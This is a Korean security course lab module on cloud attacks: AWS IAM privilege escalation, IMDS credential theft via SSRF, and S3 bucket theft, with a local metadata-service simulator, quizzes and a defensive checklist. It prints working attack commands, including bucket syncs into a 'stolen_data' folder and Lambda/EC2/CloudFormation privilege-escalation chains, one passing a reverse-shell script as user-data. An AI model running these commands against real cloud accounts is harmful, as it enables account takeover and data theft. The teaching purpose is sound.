# Week 13: 클라우드 공격 — AWS IAM 악용, 메타데이터 서비스, S3 탈취

## 학습 목표
- **클라우드 환경(AWS, GCP, Azure)**의 보안 모델과 공격 표면을 이해한다
- **AWS IAM(Identity and Access Management)** 정책의 취약점을 식별하고 악용할 수 있다
- **메타데이터 서비스(IMDS)**를 통한 크레덴셜 탈취 공격을 실행할 수 있다
- **S3 버킷** 설정 오류를 식별하고 데이터를 탈취할 수 있다
- 클라우드 권한 상승 경로를 분석하고 공격 체인을 구성할 수 있다
- 클라우드 보안 모범 사례와 방어 전략을 수립할 수 있다
- MITRE ATT&CK Cloud Matrix의 관련 기법을 매핑할 수 있다

## 전제 조건
- HTTP/HTTPS 프로토콜을 이해하고 있어야 한다
- SSRF 공격(Week 04)의 원리를 알고 있어야 한다
- JSON/YAML 형식을 읽고 해석할 수 있어야 한다
- API 키 기반 인증 개념을 이해하고 있어야 한다

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 실습 기지 | `ssh opsclaw@10.20.30.201` |
| secu | 10.20.30.1 | 방화벽/IPS | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 (클라우드 시뮬레이션) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM 모니터링 | `sshpass -p1 ssh siem@10.20.30.100` |

> **참고**: 실제 AWS 환경이 없으므로 로컬 시뮬레이션으로 원리를 학습한다.

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 클라우드 보안 모델 + IAM 이론 | 강의 |
| 0:40-1:10 | IAM 정책 분석 + 악용 실습 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-1:55 | 메타데이터 서비스 공격 실습 | 실습 |
| 1:55-2:30 | S3 버킷 탈취 + 권한 상승 | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 클라우드 방어 + 종합 실습 | 실습 |
| 3:10-3:30 | ATT&CK 매핑 + 퀴즈 + 과제 | 토론/퀴즈 |

---

# Part 1: 클라우드 보안 모델과 IAM (40분)

## 1.1 클라우드 공격 표면

| 공격 표면 | 예시 | 위험도 | ATT&CK |
|----------|------|--------|--------|
| **IAM 오설정** | 과도한 권한, 와일드카드 | 매우 높음 | T1078.004 |
| **메타데이터 서비스** | IMDS v1 SSRF | 매우 높음 | T1552.005 |
| **S3 공개 버킷** | ACL 오설정 | 높음 | T1530 |
| **Lambda 환경변수** | 시크릿 평문 저장 | 높음 | T1552.001 |
| **EC2 보안그룹** | 0.0.0.0/0 인바운드 | 중간 | T1190 |
| **CloudTrail 비활성** | 감사 로그 없음 | 높음 | T1562.008 |
| **KMS 키 정책** | 암호화 키 접근 제어 | 높음 | T1552 |

## 1.2 AWS IAM 구조

```
[IAM 계층 구조]
AWS Account
  ├── Root User (최고 권한, 사용 금지 권장)
  ├── IAM Users
  │   ├── user1 (AccessKey + SecretKey)
  │   └── user2 (Console Password)
  ├── IAM Groups
  │   ├── Developers (PowerUserAccess)
  │   └── Admins (AdministratorAccess)
  ├── IAM Roles
  │   ├── EC2-Role (EC2 인스턴스에 부여)
  │   └── Lambda-Role (Lambda 함수에 부여)
  └── Policies
      ├── AWS Managed (AdministratorAccess 등)
      └── Customer Managed (커스텀 정책)
```

### IAM 정책 위험 패턴

```json
// 위험 1: 와일드카드 리소스 + 모든 액션
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}

// 위험 2: iam:PassRole + 와일드카드
{
  "Effect": "Allow",
  "Action": ["iam:PassRole"],
  "Resource": "*"
}

// 위험 3: AssumeRole 제한 없음
{
  "Effect": "Allow",
  "Action": "sts:AssumeRole",
  "Resource": "*"
}
```

## 실습 1.1: IAM 정책 분석과 악용

> **실습 목적**: IAM 정책의 과도한 권한 설정을 식별하고 권한 상승 경로를 발견한다
>
> **배우는 것**: IAM 정책 JSON 분석, 위험 패턴 식별, 권한 상승 체인 구성을 배운다
>
> **결과 해석**: 과도한 권한이 발견되고 상승 경로가 구성되면 IAM 악용 성공이다
>
> **실전 활용**: 클라우드 모의해킹에서 IAM 정책 분석이 첫 번째 단계이다
>
> **명령어 해설**: AWS CLI aws iam list-policies, get-policy-version으로 정책을 분석한다
>
> **트러블슈팅**: AWS 환경이 없으면 시뮬레이션으로 정책 분석을 학습한다

```bash
python3 << 'PYEOF'
import json

print("=== IAM 정책 분석 시뮬레이션 ===")
print()

# 시뮬레이션 IAM 정책
policies = {
    "dev-user": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": ["s3:*", "ec2:Describe*", "lambda:*", "iam:PassRole"],
                "Resource": "*"
            }
        ]
    },
    "ci-user": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": ["ecr:*", "ecs:*", "iam:CreateRole", "iam:AttachRolePolicy"],
                "Resource": "*"
            }
        ]
    },
}

# 위험 분석
dangerous_actions = {
    "iam:PassRole": "역할 전달 → Lambda/EC2에 고권한 역할 부여",
    "iam:CreateRole": "새 역할 생성 → 관리자 정책 부착",
    "iam:AttachRolePolicy": "기존 역할에 정책 부착 → 권한 상승",
    "iam:CreateUser": "새 사용자 생성 → 백도어",
    "iam:CreateAccessKey": "다른 사용자 키 생성 → 계정 탈취",
    "sts:AssumeRole": "역할 전환 → 교차 계정 접근",
    "lambda:*": "Lambda 생성 → 코드 실행",
    "s3:*": "S3 전체 접근 → 데이터 유출",
}

for user, policy in policies.items():
    print(f"[사용자: {user}]")
    for stmt in policy["Statement"]:
        for action in stmt["Action"]:
            base_action = action.replace("*", "").rstrip(":")
            for danger, desc in dangerous_actions.items():
                if danger.startswith(base_action) or action == danger:
                    print(f"  [!!] {action} → {desc}")
    print()

print("=== IAM 권한 상승 체인 ===")
print("dev-user:")
print("  1. iam:PassRole → Lambda에 AdministratorAccess 역할 부여")
print("  2. lambda:CreateFunction → 관리자 권한으로 Lambda 생성")
print("  3. Lambda에서 iam:CreateAccessKey → Root 키 생성!")
print()
print("ci-user:")
print("  1. iam:CreateRole → AdminRole 생성")
print("  2. iam:AttachRolePolicy → AdministratorAccess 부착")
print("  3. iam:PassRole 없어도 ECS에서 역할 사용 가능")
PYEOF
```

---

# Part 2: 메타데이터 서비스 공격 (35분)

## 2.1 IMDS (Instance Metadata Service)

```
[IMDS 구조]
http://169.254.169.254/latest/
  ├── meta-data/
  │   ├── ami-id
  │   ├── hostname
  │   ├── instance-id
  │   ├── local-ipv4
  │   ├── public-ipv4
  │   ├── iam/
  │   │   └── security-credentials/
  │   │       └── EC2-Role  ← IAM 임시 크레덴셜!
  │   └── network/
  └── user-data/  ← 사용자 정의 스크립트 (비밀번호 포함 가능)
```

### IMDS v1 vs v2

| 항목 | IMDSv1 | IMDSv2 |
|------|--------|--------|
| 접근 방법 | GET 요청만 | PUT으로 토큰 발급 → 토큰으로 GET |
| SSRF 방어 | 없음 | 토큰 필요 (SSRF 어려움) |
| Hop 제한 | 없음 | TTL=1 (프록시 우회 방지) |
| 권고 | 비활성 | 기본 사용 |

## 실습 2.1: IMDS 공격 시뮬레이션

> **실습 목적**: SSRF를 통한 IMDS 접근과 IAM 크레덴셜 탈취를 시뮬레이션한다
>
> **배우는 것**: IMDS v1의 취약성, 임시 크레덴셜 구조, AWS API 악용을 배운다
>
> **결과 해석**: IMDS에서 AccessKeyId, SecretAccessKey, Token을 획득하면 성공이다
>
> **실전 활용**: Capital One 해킹(2019) 등 실제 클라우드 침해의 핵심 기법이다
>
> **명령어 해설**: curl로 169.254.169.254에 접근하여 메타데이터를 수집한다
>
> **트러블슈팅**: IMDSv2가 강제되면 PUT 요청으로 토큰을 먼저 발급받아야 한다

```bash
# IMDS 시뮬레이션 서버
cat > /tmp/imds_sim.py << 'IMDS'
import http.server
import json

class IMDSHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        responses = {
            "/latest/meta-data/": "ami-id\nhostname\ninstance-id\niam/\nlocal-ipv4",
            "/latest/meta-data/hostname": "web-server-prod-01",
            "/latest/meta-data/instance-id": "i-0123456789abcdef0",
            "/latest/meta-data/local-ipv4": "10.20.30.80",
            "/latest/meta-data/iam/security-credentials/": "EC2-S3-ReadWrite",
            "/latest/meta-data/iam/security-credentials/EC2-S3-ReadWrite": json.dumps({
                "Code": "Success",
                "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
                "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                "Token": "IQoJb3JpZ2luX2VjEBAaDmFwLXNvdXRoZWFzdC0x...",
                "Expiration": "2026-04-04T20:00:00Z",
                "Type": "AWS-HMAC"
            }, indent=2),
            "/latest/user-data": "#!/bin/bash\nDB_PASS=ProductionPass123!\naws s3 sync s3://company-backup /backup",
        }
        path = self.path
        if path in responses:
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(responses[path].encode())
        else:
            self.send_response(404)
            self.end_headers()
    def log_message(self, format, *args): pass

if __name__ == '__main__':
    server = http.server.HTTPServer(('0.0.0.0', 16925), IMDSHandler)
    import threading
    threading.Timer(15.0, server.shutdown).start()
    server.serve_forever()
IMDS

python3 /tmp/imds_sim.py &
IMDS_PID=$!
sleep 1

echo "=== IMDS 공격 시뮬레이션 ==="
echo ""
echo "[1] 메타데이터 열거"
curl -s http://localhost:16925/latest/meta-data/

echo ""
echo "[2] 호스트 정보"
echo "  hostname: $(curl -s http://localhost:16925/latest/meta-data/hostname)"
echo "  instance-id: $(curl -s http://localhost:16925/latest/meta-data/instance-id)"

echo ""
echo "[3] IAM 역할 크레덴셜 탈취!"
echo "  역할: $(curl -s http://localhost:16925/latest/meta-data/iam/security-credentials/)"
curl -s http://localhost:16925/latest/meta-data/iam/security-credentials/EC2-S3-ReadWrite | python3 -m json.tool 2>/dev/null

echo ""
echo "[4] user-data (비밀 정보 포함 가능)"
curl -s http://localhost:16925/latest/user-data

echo ""
echo "[5] 탈취한 크레덴셜로 AWS API 호출"
echo "  export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE"
echo "  export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/..."
echo "  export AWS_SESSION_TOKEN=IQoJb3JpZ2..."
echo "  aws s3 ls  # S3 버킷 목록 조회"
echo "  aws iam get-user  # 현재 사용자 확인"

kill $IMDS_PID 2>/dev/null
rm -f /tmp/imds_sim.py
echo ""
echo "[IMDS 시뮬레이션 완료]"
```

---

# Part 3-4: S3 탈취, 클라우드 방어 (35분)

## 실습 3.1: S3 버킷 보안 분석

> **실습 목적**: S3 버킷의 공개 설정과 ACL 오류를 식별하고 데이터를 탈취하는 기법을 배운다
>
> **배우는 것**: S3 ACL, 버킷 정책, 공개 접근 차단 설정의 분석과 악용을 배운다
>
> **결과 해석**: 공개 버킷에서 민감 데이터를 다운로드할 수 있으면 S3 탈취 성공이다
>
> **실전 활용**: 클라우드 보안 감사에서 S3 설정 검토에 활용한다
>
> **명령어 해설**: aws s3 ls, aws s3 cp로 버킷 내용을 열거하고 다운로드한다
>
> **트러블슈팅**: 접근 거부 시 다른 인증 방법(IMDS 크레덴셜)을 시도한다

```bash
python3 << 'PYEOF'
import json

print("=== S3 버킷 보안 분석 시뮬레이션 ===")
print()

# 위험한 S3 버킷 정책 예시
policies = {
    "company-public-assets": {
        "정책": "공개 읽기",
        "위험": "낮음 (의도적 공개)",
        "내용": "이미지, CSS, JS",
    },
    "company-backup-2025": {
        "정책": "ACL: authenticated-users READ",
        "위험": "매우 높음! (모든 AWS 계정 읽기)",
        "내용": "DB 백업, 설정 파일",
    },
    "company-logs": {
        "정책": "버킷 정책에 s3:* 와일드카드",
        "위험": "높음 (모든 작업 허용)",
        "내용": "CloudTrail 로그, 접근 로그",
    },
    "company-internal-docs": {
        "정책": "Block Public Access OFF",
        "위험": "중간 (실수로 공개 가능)",
        "내용": "내부 문서, HR 파일",
    },
}

print("[S3 버킷 보안 스캔 결과]")
for bucket, info in policies.items():
    risk_color = "!!" if "매우" in info["위험"] or "높음" in info["위험"] else "OK"
    print(f"\n  [{risk_color}] s3://{bucket}")
    print(f"    정책: {info['정책']}")
    print(f"    위험: {info['위험']}")
    print(f"    내용: {info['내용']}")

print()
print("=== S3 공격 명령어 ===")
print("  # 버킷 목록")
print("  aws s3 ls")
print("  # 버킷 내용 열거")
print("  aws s3 ls s3://company-backup-2025 --recursive")
print("  # 데이터 다운로드")
print("  aws s3 cp s3://company-backup-2025/db_dump.sql ./")
print("  # 전체 동기화")
print("  aws s3 sync s3://company-backup-2025 ./stolen_data/")
print()
print("=== S3 방어 ===")
print("  1. Block Public Access 활성화 (계정 수준)")
print("  2. 버킷 정책 최소 권한")
print("  3. S3 Object Lock (삭제 방지)")
print("  4. CloudTrail S3 이벤트 로깅")
print("  5. AWS Config 규칙으로 공개 버킷 탐지")
PYEOF
```

## 실습 3.2: 클라우드 권한 상승 체인

> **실습 목적**: 클라우드 환경에서의 권한 상승 경로를 분석하고 체인을 구성한다
>
> **배우는 것**: IAM 권한 남용, 서비스 간 역할 전환, 크로스 계정 접근의 체인을 배운다
>
> **결과 해석**: 제한된 권한에서 관리자 권한까지 상승하는 경로가 구성되면 성공이다
>
> **실전 활용**: 클라우드 보안 감사에서 권한 상승 리스크를 평가하는 데 활용한다
>
> **명령어 해설**: AWS CLI 명령과 IAM 정책 분석을 조합한다
>
> **트러블슈팅**: 권한이 부족하면 다른 역할/서비스를 경유하는 간접 경로를 탐색한다

```bash
python3 << 'PYEOF'
print("=== 클라우드 권한 상승 체인 ===")
print()

chains = [
    {
        "name": "Chain A: Lambda를 통한 권한 상승",
        "steps": [
            "1. 현재: ec2:*, lambda:*, iam:PassRole 보유",
            "2. IAM 역할 'AdminLambdaRole' 발견 (AdministratorAccess)",
            "3. Lambda 함수 생성 + AdminLambdaRole 부여",
            "4. Lambda에서 iam:CreateAccessKey 실행",
            "5. 새 Access Key로 관리자 접근!",
        ],
        "command": [
            "aws lambda create-function --function-name privesc \\",
            "  --runtime python3.11 --handler index.handler \\",
            "  --role arn:aws:iam::123456789:role/AdminLambdaRole \\",
            "  --zip-file fileb://payload.zip",
        ],
    },
    {
        "name": "Chain B: EC2 역할을 통한 상승",
        "steps": [
            "1. 현재: ec2:RunInstances, iam:PassRole 보유",
            "2. 새 EC2 인스턴스에 관리자 역할 부여하여 시작",
            "3. 인스턴스의 IMDS에서 관리자 크레덴셜 획득",
            "4. 관리자 크레덴셜로 모든 AWS 리소스 접근",
        ],
        "command": [
            "aws ec2 run-instances --instance-type t2.micro \\",
            "  --iam-instance-profile Name=AdminProfile \\",
            "  --user-data file://reverse_shell.sh",
        ],
    },
    {
        "name": "Chain C: CloudFormation을 통한 상승",
        "steps": [
            "1. 현재: cloudformation:* 보유",
            "2. CloudFormation 템플릿에 IAM 역할 생성 포함",
            "3. 스택 배포 시 관리자 역할 자동 생성",
            "4. 생성된 역할의 키로 접근",
        ],
        "command": [
            "aws cloudformation create-stack --stack-name privesc \\",
            "  --template-body file://admin_role.yaml \\",
            "  --capabilities CAPABILITY_NAMED_IAM",
        ],
    },
]

for chain in chains:
    print(f"[{chain['name']}]")
    for step in chain["steps"]:
        print(f"  {step}")
    print(f"  명령:")
    for cmd in chain["command"]:
        print(f"    {cmd}")
    print()

print("=== 권한 상승 도구 ===")
print("  Pacu: AWS 익스플로잇 프레임워크")
print("  ScoutSuite: 클라우드 보안 감사")
print("  Prowler: AWS 보안 모범 사례 검사")
print("  CloudSploit: 다중 클라우드 보안 스캔")
print("  PMAPPER: IAM 권한 상승 경로 분석")
PYEOF
```

## 실습 3.3: 클라우드 보안 종합 점검

> **실습 목적**: 클라우드 환경의 보안 설정을 종합적으로 점검하고 취약점을 식별한다
>
> **배우는 것**: 클라우드 보안 모범 사례, CIS Benchmark, AWS Well-Architected를 배운다
>
> **결과 해석**: 보안 설정 미흡 항목이 식별되고 개선안이 제시되면 점검 성공이다
>
> **실전 활용**: 클라우드 보안 감사와 컴플라이언스 검증에 활용한다
>
> **명령어 해설**: Prowler/ScoutSuite 스타일의 보안 점검 항목을 수동으로 확인한다
>
> **트러블슈팅**: 특정 서비스에 접근이 없으면 설정 파일 분석으로 대체한다

```bash
echo "=== 클라우드 보안 종합 점검 (CIS Benchmark 기반) ==="

cat << 'CHECKLIST'

[IAM 보안]
  [ ] Root 계정 MFA 활성화
  [ ] Root 계정 Access Key 비활성화
  [ ] IAM 사용자 MFA 강제
  [ ] 90일 이상 미사용 크레덴셜 비활성화
  [ ] 비밀번호 복잡도 정책 (14자 이상)
  [ ] IAM 정책에 * 리소스/액션 금지
  [ ] iam:PassRole 최소화
  [ ] 서비스 계정에 Access Key 대신 역할 사용

[S3 보안]
  [ ] Block Public Access 전체 활성화
  [ ] S3 버킷 암호화 (SSE-S3/SSE-KMS)
  [ ] 버킷 정책에 공개 접근 금지
  [ ] S3 액세스 로깅 활성화
  [ ] S3 Object Lock 활성화 (랜섬웨어 방어)

[네트워크 보안]
  [ ] 기본 VPC 삭제
  [ ] 보안 그룹에 0.0.0.0/0 인바운드 금지
  [ ] VPC Flow Log 활성화
  [ ] NAT Gateway 또는 VPC Endpoint 사용
  [ ] 네트워크 ACL 규칙 검토

[모니터링]
  [ ] CloudTrail 전체 리전 활성화
  [ ] CloudTrail 로그 암호화 + S3 보존
  [ ] GuardDuty 활성화
  [ ] Config 규칙 활성화
  [ ] CloudWatch 알림 설정

[EC2/컴퓨팅]
  [ ] IMDSv2 강제 (IMDSv1 비활성)
  [ ] EBS 볼륨 암호화
  [ ] 공개 AMI 금지
  [ ] Security Group 최소 포트 열기
  [ ] Systems Manager Patch Manager 적용

점검 결과 요약:
  ✓ 준수: ___ / 25 항목
  ✗ 미준수: ___ / 25 항목
  위험도: Critical ___, High ___, Medium ___, Low ___

CHECKLIST
```

---

## 검증 체크리스트

| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
|------|---------|----------|----------|
| 1 | IAM 구조 이해 | 구두 설명 | User/Role/Policy |
| 2 | 위험 정책 식별 | JSON 분석 | 3개 이상 위험 패턴 |
| 3 | IMDS 접근 | curl 시뮬레이션 | 크레덴셜 추출 |
| 4 | IMDSv1 vs v2 | 비교 | 보안 차이 설명 |
| 5 | S3 ACL 분석 | 정책 분석 | 공개 버킷 식별 |
| 6 | IAM 권한 상승 | 체인 구성 | PassRole→Lambda |
| 7 | user-data 탈취 | curl | 비밀 정보 추출 |
| 8 | 클라우드 방어 | 체크리스트 | 10항목 이상 |
| 9 | Capital One 분석 | 사례 | SSRF→IMDS 설명 |
| 10 | ATT&CK 매핑 | Cloud Matrix | 5개 이상 기법 |

---

## 자가 점검 퀴즈

**Q1.** SSRF를 통해 IMDS에 접근할 수 있는 이유는?

<details><summary>정답</summary>
IMDS는 169.254.169.254(Link-Local)에서 HTTP로 제공되며, EC2 인스턴스 내부에서만 접근 가능하다. 웹 애플리케이션에 SSRF 취약점이 있으면, 서버가 169.254.169.254로 HTTP 요청을 보내도록 유도하여 메타데이터(IAM 크레덴셜 포함)를 탈취할 수 있다.
</details>

**Q2.** IMDSv2가 SSRF를 방어하는 원리는?

<details><summary>정답</summary>
IMDSv2는 먼저 PUT 요청으로 세션 토큰을 발급받아야 메타데이터에 접근할 수 있다. 대부분의 SSRF는 GET/POST만 가능하므로 PUT 요청이 어렵다. 또한 토큰의 TTL(Time To Live)을 1로 설정하여 프록시를 통한 전달을 방지한다.
</details>

**Q3.** iam:PassRole 권한이 위험한 이유는?

<details><summary>정답</summary>
PassRole은 EC2, Lambda 등의 서비스에 IAM 역할을 부여하는 권한이다. 공격자가 AdministratorAccess 정책이 부착된 역할을 Lambda에 전달하면, 해당 Lambda가 관리자 권한으로 실행된다. 즉 자신의 권한보다 높은 역할을 서비스에 위임하여 간접적 권한 상승이 가능하다.
</details>

**Q4.** S3 버킷에서 "authenticated-users" READ가 위험한 이유는?

<details><summary>정답</summary>
"authenticated-users"는 조직 내 사용자가 아니라 모든 AWS 계정의 인증된 사용자를 의미한다. 누구든 AWS 무료 계정을 만들면 해당 버킷의 데이터를 읽을 수 있다. 이 설정은 "공개"나 다름없으며, 실제로 많은 데이터 유출 사고의 원인이 되었다.
</details>

**Q5.** EC2 user-data에 비밀번호를 저장하면 안 되는 이유는?

<details><summary>정답</summary>
user-data는 IMDS를 통해 접근 가능하므로 SSRF로 탈취될 수 있다. 또한 EC2 콘솔에서 직접 확인할 수 있고, 인스턴스 이미지(AMI)에 포함되어 다른 인스턴스로 복제될 수 있다. 비밀은 AWS Secrets Manager나 Parameter Store에 저장해야 한다.
</details>

**Q6.** CloudTrail을 비활성화하면 공격자에게 유리한 이유는?

<details><summary>정답</summary>
CloudTrail은 AWS API 호출을 로깅하는 감사 서비스이다. 비활성화하면 공격자의 API 호출(IAM 변경, S3 접근, EC2 조작 등)이 기록되지 않아 포렌식과 인시던트 대응이 불가능해진다.
</details>

**Q7.** Capital One 해킹(2019)의 공격 체인을 설명하라.

<details><summary>정답</summary>
1. WAF의 SSRF 취약점 발견
2. SSRF로 IMDS(169.254.169.254) 접근
3. EC2 역할의 IAM 임시 크레덴셜 탈취
4. 크레덴셜로 S3 버킷 접근
5. 1억+ 고객 데이터 다운로드
6. 피해: 1억 600만 명 개인정보 유출, $80M 벌금
</details>

**Q8.** AWS에서 최소 권한 원칙을 적용하는 방법 3가지는?

<details><summary>정답</summary>
1. IAM Access Analyzer로 미사용 권한 식별 및 제거
2. 인라인 정책 대신 관리형 정책 사용 (재사용 및 감사)
3. 조건(Condition) 활용: IP 제한, MFA 필수, 시간 제한
</details>

**Q9.** S3 Block Public Access의 4가지 설정은?

<details><summary>정답</summary>
1. BlockPublicAcls: 공개 ACL 추가 차단
2. IgnorePublicAcls: 기존 공개 ACL 무시
3. BlockPublicPolicy: 공개 버킷 정책 차단
4. RestrictPublicBuckets: 공개 버킷의 교차 계정 접근 제한
</details>

**Q10.** 실습 환경을 AWS로 마이그레이션한다면 가장 큰 보안 위험은?

<details><summary>정답</summary>
1. .env 파일의 API 키가 EC2 user-data에 포함될 위험
2. SubAgent가 과도한 IAM 권한(EC2 Full Access)을 가질 위험
3. PostgreSQL DB가 공개 서브넷에 배치될 위험
4. S3에 로그/백업 저장 시 ACL 오설정으로 공개될 위험
</details>

---

## 과제

### 과제 1: 클라우드 공격 치트시트 (개인)
AWS IAM 악용, IMDS 공격, S3 탈취, Lambda 악용, CloudTrail 회피 5가지에 대한 치트시트를 작성하라. 각 공격의 전제 조건, 명령어, 방어 방법을 포함할 것.

### 과제 2: 클라우드 보안 아키텍처 (팀)
실습 환경(OpsClaw)을 AWS에 배포하는 경우의 보안 아키텍처를 설계하라. VPC, IAM, S3, KMS, CloudTrail, GuardDuty 설정을 포함할 것.

### 과제 3: IMDS 방어 테스트 (팀)
IMDSv1과 IMDSv2에 대한 SSRF 공격 시나리오를 각각 작성하고, v2의 방어 효과를 검증하는 테스트 계획을 수립하라.
